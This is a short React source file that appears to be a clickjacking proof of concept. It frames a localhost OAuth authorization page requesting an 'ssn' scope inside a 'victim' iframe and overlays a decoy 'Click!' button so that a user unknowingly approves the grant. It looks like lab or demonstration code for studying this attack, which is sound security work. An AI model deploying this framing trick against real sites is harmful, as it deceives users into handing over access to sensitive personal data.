import React, { useState, useEffect } from 'react';
import './App.css';
import Iframe from 'react-iframe';

const App = () => {
  const URL = "https://localhost:3002/authorize?response_type=code&scopes=ssn&client_id=FSB&redirect_uri=https%3A%2F%2Flocalhost%3A5000%2Fcallback&state=8ct13nlaacgti4s5";
    
  return (
    <div className="App">
        <Iframe url={URL}
            width = "800px"
            height = "1024px"
            position = "absolute"
            className="App-victim-iframe"
            />            

      <button className="App-clickjack-button">
          Click!
      </button>
    </div>
    
  );
}
export default App;